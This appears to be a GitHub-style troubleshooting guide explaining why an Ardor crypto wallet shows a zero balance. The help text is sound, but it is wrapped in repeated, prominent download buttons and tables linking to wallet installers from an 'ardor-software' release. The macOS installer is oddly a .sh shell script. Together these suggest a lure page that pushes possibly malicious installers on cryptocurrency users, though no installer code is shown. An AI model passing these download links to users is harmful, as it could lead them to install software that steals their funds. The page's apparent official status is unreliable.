![Ardor Wallet guide](assets/banner-article.png)

# Why the Ardor wallet shows a zero balance

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A zero balance in the Ardor wallet almost never means the funds are gone. In light-client mode it is expected while the node you are reading from is behind, on a full client it means the chain has not finished downloading, and on either it can simply mean the wrong chain is selected. A real loss looks different, and this page shows how to tell the cases apart.

## What you see

The account opens with the address you expect and a balance of zero. Sometimes the block height is still climbing; sometimes it sits still. Ignis or the Nxt [child chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) may show a balance while the parent chain does not. The transaction history may be empty, partial, or complete but ending before the transaction you are looking for.

Those details are the diagnosis. Write them down before changing anything, because a restart wipes the state you were reading.

## The four causes, in order of likelihood

| What you see | Cause | Fix |
|---|---|---|
| Zero on the parent chain, a balance on a child chain | Wrong chain selected | Switch the chain selector |
| Height climbing slowly, balance zero | Full client still syncing | Wait, or check the address elsewhere |
| Height stuck, "connected to a node" but nothing moves | Light client reading a lagging node | Restart, or switch to the full client |
| A different address than you expected | Different secret entered | Re-enter from the written copy |

The fourth row is the only one that concerns the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) rather than the view. If the address matches your records, the funds are on the chain and the wallet simply cannot see them yet.

## Why a light client shows zero

A [light client](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md) keeps no chain data. It asks remote nodes for balances, and a remote node that is behind answers with an older state, where your account may have had nothing. The wallet is reporting what it was told, accurately.

The same applies during a full client's first [download](https://github.com/ardor-software/ardor-wallet-guides/blob/main/verify-your-ardor-wallet-download.md). Until the local database reaches the block that contains your transaction, the balance is unknown rather than zero. The wallet has no way to display "not yet known" as a number, so it displays nothing, which reads as zero.

## How to check without trusting the wallet

Look the address up on a block explorer. That is an independent read of the chain, and it settles whether the balance exists. If the explorer shows the funds and the wallet does not, the problem is local and temporary.

Do not use a page that asks for your secret in order to check a balance. A read-only lookup needs only the public address, and any site that wants more is collecting accounts rather than displaying them.

Keep the explorer result somewhere you can point at - a bookmark, or the address written down beside the balance you expect. When a wallet and a website disagree, the disagreement is the useful information, and remembering which figure came from where is what turns a second opinion into evidence.

## Fix it step by step

1. Confirm the address shown matches your written record exactly. One character is enough to produce a different account with a zero balance.
2. Switch the chain selector through the parent chain and each child chain, and note where balances appear.
3. Compare the block height with a block explorer. A height far behind the chain is a sync problem, not a balance problem.
4. On a light client, restart the wallet and let it pick a node again.
5. On a full client, leave it running until the height catches up, then re-open the account.
6. If the height will not move at all, check the connection and firewall rules, then reinstall without the light-client option.

Most reports end at step two or three. Steps four to six address the cases where the wallet is running but not following the chain.

## If it is still zero

Check the transaction itself. A send that never confirmed is not in the chain, so the sender's balance is unchanged and the recipient's is untouched; the transaction row will show it as pending or not show it at all. The unconfirmed transactions guide covers that case.

If the explorer shows the balance and a full client at the correct height still does not, reinstall the wallet and let it rebuild its view. That is the last local step, and it costs sync time rather than funds.

## Prevention

Run a full client if balances matter and you can spare the disk. Keep the wallet's version current, because sync problems are one of the things a release fixes. Write down the address you expect at setup, so a wrong-account error is caught in seconds rather than after a panic.

And keep the secret where it belongs. Every step on this page needs the public address only; no legitimate fix requires typing the passphrase into anything, and a wallet that asks for it to show a balance is not the wallet.

## FAQ

### Can a zero balance mean my funds were stolen?

It can, but that is the least likely explanation. Check the address first, then the chain selector, then the sync state, and only then look at the transaction history for an outgoing transfer you did not make.

### Why does Ignis show a balance when ARDR shows zero?

Because the chains are separate ledgers. A balance on a child chain says nothing about the parent chain, and the selector may simply be pointing at the child chain.

### How long does a full sync take?

It depends on the machine, the disk and the connection, and it is measured in hours rather than minutes for a chain of this age. A light client avoids the wait at the cost of depending on remote nodes.

### Does restarting the wallet lose anything?

No. The account comes from the secret, and the chain is on disk or on the network. Restarting only clears the local view, which is why it is a reasonable step rather than a risky one.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Fix an Ardor wallet that will not sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md)
- [Ardor light client or full node: choose before you start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md)
- [Why an Ardor transaction stays unconfirmed](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md)
- [Where Ardor stores blockchain data, and how much space it takes](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/where-ardor-stores-blockchain-data.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
